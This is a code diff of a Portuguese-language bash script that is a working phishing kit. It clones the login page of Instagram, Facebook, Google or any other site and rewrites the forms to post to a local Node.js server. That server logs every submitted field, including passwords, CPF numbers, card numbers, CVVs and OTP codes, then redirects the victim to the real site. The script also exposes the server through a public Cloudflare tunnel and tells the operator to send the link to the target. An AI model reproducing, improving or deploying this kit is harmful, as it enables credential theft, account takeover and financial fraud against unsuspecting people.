@@ -20,76 +20,42 @@ fi
 # WORDLIST - Nomes comuns de campos de login
 # =============================================
 WORDLIST=(
-    # Login/Entrar
     "login" "signin" "sign_in" "log_in" "entrar" "acessar" "acesso"
     "sign-in" "log-in" "singin" "sing_in" "iniciar_sessao" "iniciar"
     "cadastrar" "cadastro" "registrar" "registro" "criar_conta"
-    "create_account" "subscribe" "inscricao"
-
-    # Usuário/Email/Telefone
-    "username" "user_name" "user-name" "usuario" "nome" "name"
-    "email" "e-mail" "mail" "telefone" "phone" "telemovel" "celular"
-    "cpf" "cnpj" "documento" "rg" "identificacao" "matricula"
-    "identification" "identifier" "login_id" "loginid" "userid"
-    "user" "uname" "nick" "nickname" "login_email" "login_phone"
-    "mobile" "cellphone" "contact" "username_email" "email_phone"
-
-    # Senha
-    "password" "senha" "pass" "passwd" "pass_word" "pwd"
-    "palavra_pave" "palavra_chave" "chave" "secret" "secret_password"
-    "new_password" "new_password" "nova_senha" "confirm_password"
-    "confirm_senha" "confirmar_senha" "confirmar" "confirmation"
-
-    # Nome completo / Dados pessoais
-    "fullname" "full_name" "nome_completo" "nome_real" "real_name"
-    "firstname" "first_name" "nome" "sobrenome" "lastname" "last_name"
-    "social_name" "razao_social" "nome_mae" "nome_pai"
-    "birthdate" "data_nascimento" "nascimento" "birth_date" "dob"
-    "genero" "sexo" "gender" "estado_civil"
-
-    # Endereço
-    "endereco" "address" "rua" "street" "cidade" "city"
-    "estado" "state" "cep" "zip" "zipcode" "postal_code"
-    "bairro" "neighborhood" "pais" "country" "complemento"
-
-    # Trabalho/Escola
-    "empresa" "company" "trabalho" "work" "profissao" "occupation"
+    "create_account" "subscribe" "inscricao" "username" "user_name"
+    "user-name" "usuario" "nome" "name" "email" "e-mail" "mail"
+    "telefone" "phone" "telemovel" "celular" "cpf" "cnpj" "documento"
+    "rg" "identificacao" "matricula" "identification" "identifier"
+    "login_id" "loginid" "userid" "user" "uname" "nick" "nickname"
+    "login_email" "login_phone" "password" "senha" "pass" "passwd"
+    "pwd" "palavra" "chave" "secret" "pin" "codigo" "fullname"
+    "first_name" "lastname" "sobrenome" "social_name" "razao_social"
+    "mae" "pai" "data" "date" "nascimento" "birth" "birthdate"
+    "ano" "mes" "dia" "endereco" "endereco" "rua" "avenida" "address"
+    "street" "cep" "zip" "zipcode" "bairro" "cidade" "cidade" "pais"
+    "country" "complemento" "empresa" "company" "trabalho" "profissao"
     "escola" "school" "universidade" "university" "curso" "course"
-    "departamento" "department" "setor" "cargo" "position"
-    "matricula" "student_id" "ra" "registration"
-
-    # Segurança/Verificação
-    "codigo" "code" "token" "otp" "pin" "verification_code"
-    "codigo_verificacao" "codigo_seguranca" "security_code"
-    "captcha" "2fa" "two_factor" "autenticacao" "auth"
-    "pergunta_secreta" "secret_question" "resposta" "answer"
-
-    # Pagamento
-    "cartao" "card" "credit_card" "cartao_credito" "cc_number"
-    "cvv" "validade" "expiry" "expiration_date" "card_holder"
-    "conta" "account" "banco" "bank" "agencia" "agency"
-    "pix" "chave_pix" "bank_account"
-
-    # Preferências
-    "linguagem" "language" "timezone" "fuso_horario"
-    "notificacao" "notification" "newsletter" "aceito_termos"
-    "termos" "terms" "privacidade" "privacy" "aceitar"
-    "remember" "lembrar" "remember_me" "manter_conectado"
-
-    # Campos genéricos
-    "campo" "field" "input" "valor" "value" "dado" "data"
-    "descricao" "description" "titulo" "title" "assunto" "subject"
-    "mensagem" "message" "comentario" "comment" "observacao"
-    "anexo" "file" "arquivo" "upload" "imagem" "photo"
-    "url" "link" "website" "dominio"
-    "data" "date" "hora" "time" "periodo" "ano" "mes" "dia"
-    "quantidade" "quantity" "qtd" "numero" "number"
-    "tipo" "type" "categoria" "category" "status"
-    "acao" "action" "operacao" "operation"
-    "id" "uuid" "chave" "key" "hash"
+    "departamento" "department" "cargo" "cartao" "card" "credit_card"
+    "cvv" "validade" "conta" "account" "banco" "bank" "agencia" "pix"
+    "token" "otp" "verification" "captcha" "2fa" "auth" "pergunta"
+    "resposta" "termos" "terms" "privacidade" "privacy" "aceitar"
+    "remember" "newsletter" "linguagem" "language" "pais" "country"
+    "genero" "sexo" "gender" "estado civil" "civil status" "casado"
+    "solteiro" "numero" "number" "andap" "andar" "apartamento" "ap"
+    "complemento" "bloco" "unidade" "disciplina" "subject" "materia"
+    "professor" "docente" "teacher" "nota" "grade" "score" "media"
+    "mensagem" "message" "comentario" "comment" "observacao" "link"
+    "url" "website" "site" "imagem" "foto" "image" "picture" "upload"
+    "arquivo" "file" "anexo" "attachment" "valor" "value" "preco"
+    "price" "quantidade" "qtd" "total" "tipo" "type" "categoria"
+    "category" "status" "situacao" "state" "acao" "action" "operacao"
+    "operation" "id" "uuid" "chave" "key" "hash" "campo" "field"
+    "input" "descricao" "description" "titulo" "title" "assunto" "subject"
+    "titulo" "mensagem" "message" "data" "date" "hora" "time" "periodo"
 )
 
-# Converter wordlist para JSON para passar ao Node.js
+# Converter wordlist para JSON
 WORDLIST_JSON="["
 for w in "${WORDLIST[@]}"; do
     WORDLIST_JSON+="\"$w\","
@@ -126,9 +92,6 @@ echo "  - https://www.instagram.com"
 echo "  - https://www.facebook.com"
 echo "  - https://accounts.google.com"
 echo "  - https://login.live.com"
-echo "  - https://twitter.com/i/flow/login"
-echo "  - https://www.netflix.com/login"
-echo "  - https://www.amazon.com/ap/signin"
 echo "  - OU QUALQUER outro site de login"
 echo ""
 echo -n "URL do site: "
@@ -156,179 +119,110 @@ read REDIRECT_URL
 [ -z "$REDIRECT_URL" ] && REDIRECT_URL="$TARGET_URL"
 [[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"
 
-# --- CLONAR SITE ---
-clear
-echo ""
-echo "[...] Clonando $TARGET_URL"
-echo ""
-rm -rf "$SITE_DIR"/*
+    # --- CLONAR SITE ---
+    clear
+    echo ""
+    echo "[...] Clonando $TARGET_URL"
+    echo ""
+    rm -rf "$SITE_DIR"/*
 
-curl -s -L -o "$SITE_DIR/index.html" \
-    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
-    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
-    -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
-    "$TARGET_URL" 2>/dev/null
+    curl -s -L -o "$SITE_DIR/index.html" \
+        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
+        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
+        -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
+        "$TARGET_URL" 2>/dev/null
 
-if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
-    echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
-    touch "$SITE_DIR/index.html"
-fi
-
-echo "[...] Baixando recursos..."
-for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
-    fname=$(basename "$css")
-    [ -f "$SITE_DIR/$fname" ] && continue
-    if [[ "$css" == http* ]]; then
-        curl -s -L -o "$SITE_DIR/$fname" "$css" 2>/dev/null
-    elif [[ "$css" == /* ]]; then
-        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-        curl -s -L -o "$SITE_DIR/$fname" "$BASE$css" 2>/dev/null
+    if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
+        echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
+        touch "$SITE_DIR/index.html"
     fi
-done
 
-for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
-    fname=$(basename "$js")
-    [ -f "$SITE_DIR/$fname" ] && continue
-    if [[ "$js" == http* ]]; then
-        curl -s -L -o "$SITE_DIR/$fname" "$js" 2>/dev/null
-    elif [[ "$js" == /* ]]; then
-        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-        curl -s -L -o "$SITE_DIR/$fname" "$BASE$js" 2>/dev/null
-    fi
-done
+    echo "[...] Baixando recursos..."
+    for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
+        fname=$(basename "$css")
+        [ -f "$SITE_DIR/$fname" ] && continue
+        if [[ "$css" == http* ]]; then
+            curl -s -L -o "$SITE_DIR/$fname" "$css" 2>/dev/null
+        elif [[ "$css" == /* ]]; then
+            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
+            curl -s -L -o "$SITE_DIR/$fname" "$BASE$css" 2>/dev/null
+        fi
+    done
 
-for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
-    fname=$(basename "$img")
-    [ -f "$SITE_DIR/$fname" ] && continue
-    if [[ "$img" == http* ]]; then
-        curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
-    elif [[ "$img" == /* ]]; then
-        BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-        curl -s -L -o "$SITE_DIR/$fname" "$BASE$img" 2>/dev/null
-    fi
-done
+    for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
+        fname=$(basename "$js")
+        [ -f "$SITE_DIR/$fname" ] && continue
+        if [[ "$js" == http* ]]; then
+            curl -s -L -o "$SITE_DIR/$fname" "$js" 2>/dev/null
+        elif [[ "$js" == /* ]]; then
+            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
+            curl -s -L -o "$SITE_DIR/$fname" "$BASE$js" 2>/dev/null
+        fi
+    done
 
-echo "[...] Configurando captura com wordlist..."
-# Modificar formularios
-sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
-sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
+    for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
+        fname=$(basename "$img")
+        [ -f "$SITE_DIR/$fname" ] && continue
+        if [[ "$img" == http* ]]; then
+            curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
+        elif [[ "$img" == /* ]]; then
+            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
+            curl -s -L -o "$SITE_DIR/$fname" "$BASE$img" 2>/dev/null
+        fi
+    done
 
-echo ""
-echo "[OK] Site clonado!"
+    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
+    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
 
-# --- CRIAR SERVIDOR ---
-cat > "$SERVER_FILE" << EOF
+    echo ""
+    echo "[OK] Site clonado!"
+
+    # --- CRIAR SERVIDOR ---
+    cat > "$SERVER_FILE" << 'SERVEREOF'
 const http=require('http'),fs=require('fs'),path=require('path');
-const PORT=${PORT};
-const SITE_DIR="${SITE_DIR}";
-const LOG_FILE="${LOG_FILE}";
-const REDIRECT="${REDIRECT_URL}";
-const LOCAL_NAME="${LOCAL_NAME}";
-const TARGET="${TARGET_URL}";
+const PORT=process.env.PORT||8080;
+const SITE_DIR=process.env.SITE_DIR||'site_clone';
+const LOG_FILE=process.env.LOG_FILE||'capturas.txt';
+const REDIRECT=process.env.REDIRECT||'https://instagram.com';
+const WORDLIST=PLACEHOLDER_WORDLIST;
 
-const WORDLIST=${WORDLIST_JSON};
-
-const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
-
-function classifyField(name, placeholder) {
-    name = (name || '').toLowerCase().replace(/^[0-9]+-|_|-[0-9]+$|_([0-9]+)/g, '').replace(/[^a-z0-9_]/g, '');
-    placeholder = (placeholder || '').toLowerCase().replace(/[^a-z0-9_]/g, '');
-
-    // Se o nome for tipo "ion-input-2", "input_1", etc, tenta identificar pelo placeholder
-    const isGenericName = name.match(/^(ion-?input|input)[-_]?[0-9]*$/) || name.match(/^input[-_]?[0-9]+$/) || name.match(/^[a-z]+[-_][0-9]+$/) || name.match(/^field[_-]?[0-9]*$/);
-    
-    if(isGenericName || name.length === 0) {
-        if(placeholder) {
-            //_wordlist de placeholders comuns (PT/EN)
-            if(['escola','colegio','faculdade','universidade','instituto','curso','serie','turma','campus'].some(p => placeholder.includes(p))) return 'ESCOLA';
-            if(['empresa','companhia','trabalho','cargo','departamento','setor','profissao','ocupacao'].some(p => placeholder.includes(p))) return 'TRABALHO';
-            if(['usuario','username','login','nome de usuario','user'].some(p => placeholder.includes(p))) return 'USUARIO';
-            if(['nome','name','full name','nome completo','sobrenome','apelido','nick'].some(p => placeholder.includes(p))) return 'NOME';
-            if(['senha','password','palavra-passe','pass','pwd','pin','chave de acesso'].some(p => placeholder.includes(p))) return 'SENHA';
-            if(['email','e-mail','correio eletronico','mail'].some(p => placeholder.includes(p))) return 'EMAIL';
-            if(['telefone','phone','telemovel','celular','mobile','whatsapp','fax'].some(p => placeholder.includes(p))) return 'TELEFONE';
-            if(['cpf','cnpj','documento','rg','identidade','passaporte','registro'].some(p => placeholder.includes(p))) return 'DOCUMENTO';
-            if(['data','nascimento','birth','ano','idade','date'].some(p => placeholder.includes(p))) return 'DATA';
-            if(['endereco','endereço','rua','avenida','address','street','cep','cep','bairro','cidade','cidade'].some(p => placeholder.includes(p))) return 'ENDERECO';
-            if(['cartao','cartão','card','credito','debito','cvv','conta','banco','agencia','pix'].some(p => placeholder.includes(p))) return 'PAGAMENTO';
-            if(['codigo','code','token','otp','verificacao','verification'].some(p => placeholder.includes(p))) return 'SEGURANCA';
-            if(['termos','condicoes','privacidade','aceito','concordo','agree'].some(p => placeholder.includes(p))) return 'TERMOS';
-            if(['pais','country','nacionalidade','nationality'].some(p => placeholder.includes(p))) return 'PAIS';
-            if(['genero','sexo','gender','masculino','feminino'].some(p => placeholder.includes(p))) return 'GENERO';
-            if(['estado civil','estado civil','civil status','casado','solteiro'].some(p => placeholder.includes(p))) return 'ESTADO_CIVIL';
-            if(['cep','zip','postal','codigo postal'].some(p => placeholder.includes(p))) return 'CEP';
-            if(['numero','número','number','num','andap','andar','apartamento','ap'].some(p => placeholder.includes(p))) return 'NUMERO';
-            if(['complemento','complement','bloco','unidade'].some(p => placeholder.includes(p))) return 'COMPLEMENTO';
-            if(['disciplina','subject','materia','cadeira'].some(p => placeholder.includes(p))) return 'DISCIPLINA';
-            if(['professor','docente','teacher','instructor'].some(p => placeholder.includes(p))) return 'PROFESSOR';
-            if(['nota','grade','score','media','média'].some(p => placeholder.includes(p))) return 'NOTA';
-            if(['mensagem','message','comentario','comment','observacao','obs'].some(p => placeholder.includes(p))) return 'MENSAGEM';
-            if(['link','url','website','site','endereco web'].some(p => placeholder.includes(p))) return 'LINK';
-            if(['imagem','foto','image','picture','avatar','upload'].some(p => placeholder.includes(p))) return 'IMAGEM';
-            if(['arquivo','file','documento file','anexo','attachment'].some(p => placeholder.includes(p))) return 'ARQUIVO';
-            if(['valor','value','preco','preço','price','quantidade','qtd','total'].some(p => placeholder.includes(p))) return 'VALOR';
-            if(['tipo','type','categoria','category','especie','espécie'].some(p => placeholder.includes(p))) return 'TIPO';
-            if(['status','situacao','situação','state'].some(p => placeholder.includes(p))) return 'STATUS';
-            if(['acao','ação','action','operacao','operação'].some(p => placeholder.includes(p))) return 'ACAO';
-            
-            // Se nao identificou, retorna o placeholder como nome do campo
-            return 'CAMPO_' + placeholder.toUpperCase().replace(/[^A-Z0-9]/g, '_');
-        }
-        return name || 'DESCONHECIDO';
-    }
-
-    for (const w of WORDLIST) {
-        if (name.includes(w) || w.includes(name)) {
-            if (['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x => w.includes(x) || x.includes(w))) return 'USUARIO';
-            if (['password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo'].some(x => w.includes(x) || x.includes(w))) return 'SENHA';
-            if (['nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai'].some(x => w.includes(x) || x.includes(w))) return 'NOME';
-            if (['data','date','nascimento','birth','birthdate','ano','mes','dia'].some(x => w.includes(x) || x.includes(w))) return 'DATA';
-            if (['endereco','address','rua','cidade','estado','cep','zip','bairro','pais','complemento'].some(x => w.includes(x) || x.includes(w))) return 'ENDERECO';
-            if (['empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','matricula'].some(x => w.includes(x) || x.includes(w))) return 'TRABALHO_ESCOLA';
-            if (['cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix'].some(x => w.includes(x) || x.includes(w))) return 'PAGAMENTO';
-            if (['token','otp','verification','captcha','2fa','auth','pergunta','resposta'].some(x => w.includes(x) || x.includes(w))) return 'SEGURANCA';
-            if (['termos','terms','privacidade','privacy','aceitar','remember','newsletter'].some(x => w.includes(x) || x.includes(w))) return 'PREFERENCIA';
-            return 'EXTRA';
+function classifyField(name){
+    name=(name||'').toLowerCase().replace(/[^a-z0-9_]/g,'');
+    for(const w of WORDLIST){
+        if(name.includes(w)||w.includes(name)){
+            if(['login','signin','sign_in','log_in','entrar','acessar','iniciar','cadastrar','registrar','username','user','email','e-mail','telefone','phone','cpf','cnpj','matricula','identifier','userid'].some(x=>w.includes(x)||x.includes(w)))return'USUARIO';
+            if(['password','senha','pass','passwd','pwd','palavra','chave','secret','pin','codigo'].some(x=>w.includes(x)||x.includes(w)))return'SENHA';
+            if(['nome','name','fullname','firstname','lastname','sobrenome','social_name','razao_social','mae','pai'].some(x=>w.includes(x)||x.includes(w)))return'NOME';
+            if(['data','date','nascimento','birth','birthdate','ano','mes','dia'].some(x=>w.includes(x)||x.includes(w)))return'DATA';
+            if(['endereco','rua','avenida','address','street','cep','zip','zipcode','bairro','cidade','pais','country','complemento'].some(x=>w.includes(x)||x.includes(w)))return'ENDERECO';
+            if(['empresa','company','trabalho','profissao','escola','universidade','curso','departamento','cargo','matricula'].some(x=>w.includes(x)||x.includes(w)))return'ESCOLA_TRABALHO';
+            if(['cartao','card','credit_card','cvv','validade','conta','banco','agencia','pix'].some(x=>w.includes(x)||x.includes(w)))return'PAGAMENTO';
+            if(['token','otp','verification','captcha','2fa','auth','pergunta','resposta'].some(x=>w.includes(x)||x.includes(w)))return'SEGURANCA';
+            if(['termos','terms','privacidade','privacy','aceitar','remember','newsletter'].some(x=>w.includes(x)||x.includes(w)))return'PREFERENCIA';
+            return'EXTRA';
         }
     }
-    return 'OUTRO';
+    return'OUTRO';
 }
 
-function saveCapture(body, ip, headers){
+function saveCapture(body,ip){
     try{
         const p=new URLSearchParams(body);
         const allFields={};
-        const classified={USUARIO:[],SENHA:[],NOME:[],DATA:[],ENDERECO:[],TRABALHO_ESCOLA:[],PAGAMENTO:[],SEGURANCA:[],PREFERENCIA:[],EXTRA:[],OUTRO:[]};
-
+        const classified={USUARIO:[],SENHA:[],NOME:[],DATA:[],ENDERECO:[],ESCOLA_TRABALHO:[],PAGAMENTO:[],SEGURANCA:[],PREFERENCIA:[],EXTRA:[],OUTRO:[]};
         for(let[k,v]of p.entries()){
             allFields[k]=v;
-            // placeholder vazio por enquanto
-            const cat=classifyField(k,'');
+            const cat=classifyField(k);
             classified[cat].push(k+': '+v);
         }
-
         const ts=new Date().toISOString().replace('T',' ').split('.')[0];
-        const logEntry={
-            timestamp:ts,
-            ip:ip,
-            target:TARGET,
-            local:LOCAL_NAME,
-            fields:allFields,
-            classified:classified
-        };
-
-        // Salvar em arquivo
-        fs.appendFileSync(LOG_FILE, JSON.stringify(logEntry)+'\n');
-
-        // Mostrar bonito no terminal
+        fs.appendFileSync(LOG_FILE,JSON.stringify({timestamp:ts,ip:ip,fields:allFields,classified:classified})+'\n');
         console.log('\n'+'='.repeat(50));
         console.log('  CAPTURADO - '+ts);
         console.log('  IP: '+ip);
         console.log('='.repeat(50));
         for(const[cat,vals]of Object.entries(classified)){
-            if(vals.length>0){
-                console.log('  ['+cat+'] '+vals.join(' | '));
-            }
+            if(vals.length>0)console.log('  ['+cat+'] '+vals.join(' | '));
         }
         console.log('='.repeat(50)+'\n');
     }catch(e){}
@@ -340,7 +234,7 @@ http.createServer((req,res)=>{
         let b='';
         req.on('data',c=>b+=c);
         req.on('end',()=>{
-            saveCapture(b,ip,req.headers);
+            saveCapture(b,ip);
             res.writeHead(302,{'Location':REDIRECT});
             res.end();
         });
@@ -349,6 +243,7 @@ http.createServer((req,res)=>{
     let f=req.url==='/'?'/index.html':req.url.split('?')[0];
     f=path.join(SITE_DIR,f);
     const ext=path.extname(f).toLowerCase();
+    const MIME={'.html':'text/html','.css':'text/css','.js':'application/javascript','.png':'image/png','.jpg':'image/jpeg','.jpeg':'image/jpeg','.gif':'image/gif','.svg':'image/svg+xml','.ico':'image/x-icon','.webp':'image/webp','.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.json':'application/json'};
     fs.readFile(f,(er,d)=>{
         if(er){
             res.writeHead(200,{'Content-Type':'text/html'});
@@ -359,124 +254,127 @@ http.createServer((req,res)=>{
         res.end(d);
     });
 }).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
-EOF
+SERVEREOF
 
-# --- OBTER IP ---
-IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
-[ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
-[ -z "$IP" ] && IP="127.0.0.1"
+    # Substituir placeholder da wordlist
+    sed -i "s/PLACEHOLDER_WORDLIST/$WORDLIST_JSON/" "$SERVER_FILE"
 
-# --- CLOUDFLARE TUNNEL ---
-CF_INSTALLED=false
-if command -v cloudflared &>/dev/null; then
-    CF_INSTALLED=true
-fi
+    # --- OBTER IP ---
+    IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
+    [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
+    [ -z "$IP" ] && IP="127.0.0.1"
 
-echo ""
-echo "=========================================="
-echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
-echo "=========================================="
-echo ""
+    # --- CLOUDFLARE TUNNEL ---
+    CF_INSTALLED=false
+    if command -v cloudflared &>/dev/null; then
+        CF_INSTALLED=true
+    fi
 
-if [ "$CF_INSTALLED" = true ]; then
-    echo "[OK] Cloudflared ja instalado!"
     echo ""
-    echo "  1) Usar Cloudflare Tunnel (recomendado)"
-    echo "  2) Usar so o IP local"
+    echo "=========================================="
+    echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
+    echo "=========================================="
     echo ""
-    echo -n "Escolha: "
-    read CF_CHOICE
-else
-    echo "Cloudflared nao instalado."
-    echo ""
-    echo "Para instalar (recomendado):"
-    echo "  pkg install cloudflared"
-    echo ""
-    echo "  1) Instalar cloudflared agora"
-    echo "  2) Usar so o IP local"
-    echo ""
-    echo -n "Escolha: "
-    read CF_CHOICE
 
-    if [ "$CF_CHOICE" = "1" ]; then
-        echo "[...] Instalando cloudflared..."
-        pkg install cloudflared -y 2>/dev/null
-        if command -v cloudflared &>/dev/null; then
-            CF_INSTALLED=true
-            echo "[OK] Instalado!"
-        else
-            echo "[ERRO] Falha na instalacao. Usando IP local."
-            CF_CHOICE=2
+    if [ "$CF_INSTALLED" = true ]; then
+        echo "[OK] Cloudflared ja instalado!"
+        echo ""
+        echo "  1) Usar Cloudflare Tunnel (recomendado)"
+        echo "  2) Usar so o IP local"
+        echo ""
+        echo -n "Escolha: "
+        read CF_CHOICE
+    else
+        echo "Cloudflared nao instalado."
+        echo ""
+        echo "Para instalar (recomendado):"
+        echo "  pkg install cloudflared"
+        echo ""
+        echo "  1) Instalar cloudflared agora"
+        echo "  2) Usar so o IP local"
+        echo ""
+        echo -n "Escolha: "
+        read CF_CHOICE
+
+        if [ "$CF_CHOICE" = "1" ]; then
+            echo "[...] Instalando cloudflared..."
+            pkg install cloudflared -y 2>/dev/null
+            if command -v cloudflared &>/dev/null; then
+                CF_INSTALLED=true
+                echo "[OK] Instalado!"
+            else
+                echo "[ERRO] Falha na instalacao. Usando IP local."
+                CF_CHOICE=2
+            fi
         fi
     fi
-fi
 
-CF_URL=""
-if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
-    echo ""
-    echo "[...] Criando tunnel..."
-    echo ""
+    CF_URL=""
+    if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
+        echo ""
+        echo "[...] Criando tunnel..."
+        echo ""
 
-    cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
-    CF_PID=$!
+        cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
+        CF_PID=$!
 
-    sleep 5
-    CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
-
-    if [ -n "$CF_URL" ]; then
-        echo "[OK] Tunnel criado!"
-    else
         sleep 5
         CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+
+        if [ -n "$CF_URL" ]; then
+            echo "[OK] Tunnel criado!"
+        else
+            sleep 5
+            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+        fi
     fi
-fi
 
-# --- MOSTRAR RESULTADO ---
-clear
-echo ""
-echo "=========================================="
-echo "         SERVIDOR PRONTO!"
-echo "=========================================="
-echo ""
-echo "  URL Local:  http://${IP}:${PORT}"
-echo ""
-if [ -n "$CF_URL" ]; then
-    echo "  🔥 URL PUBLICA (funciona em QUALQUER lugar):"
+    # --- MOSTRAR RESULTADO ---
+    clear
     echo ""
-    echo "    ${CF_URL}"
+    echo "=========================================="
+    echo "         SERVIDOR PRONTO!"
+    echo "=========================================="
     echo ""
-    echo "  Mande esse link pra pessoa!"
-    echo "  Ela acessa de QUALQUER lugar do mundo."
-else
-    echo "  Acesse de qualquer dispositivo na mesma rede:"
-    echo "  http://${IP}:${PORT}"
-fi
-echo ""
-echo "  Parar: Ctrl+C"
-echo ""
-echo "[*] Iniciando servidor..."
-echo ""
-
-REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
-
-[ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null
-
-echo ""
-echo "[*] Servidor parado."
-echo ""
-echo -n "Ver capturas? (s/n): "
-read V
-echo ""
-if [ "$V" = "s" ] || [ "$V" = "S" ]; then
-    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
-        echo "=========================================="
-        cat "$LOG_FILE"
+    echo "  URL Local:  http://${IP}:${PORT}"
+    echo ""
+    if [ -n "$CF_URL" ]; then
+        echo "  🔥 URL PUBLICA (funciona em QUALQUER lugar):"
         echo ""
-        echo "=========================================="
+        echo "    ${CF_URL}"
+        echo ""
+        echo "  Mande esse link pra pessoa!"
+        echo "  Ela acessa de QUALQUER lugar do mundo."
     else
-        echo "Nenhuma captura."
+        echo "  Acesse de qualquer dispositivo na mesma rede:"
+        echo "  http://${IP}:${PORT}"
     fi
-fi
+    echo ""
+    echo "  Parar: Ctrl+C"
+    echo ""
+    echo "[*] Iniciando servidor..."
+    echo ""
+
+    REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
+
+    [ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null
+
+    echo ""
+    echo "[*] Servidor parado."
+    echo ""
+    echo -n "Ver capturas? (s/n): "
+    read V
+    echo ""
+    if [ "$V" = "s" ] || [ "$V" = "S" ]; then
+        if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
+            echo "=========================================="
+            cat "$LOG_FILE"
+            echo ""
+            echo "=========================================="
+        else
+            echo "Nenhuma captura."
+        fi
+    fi
 
 elif [ "$MENU" = "2" ]; then
     echo ""
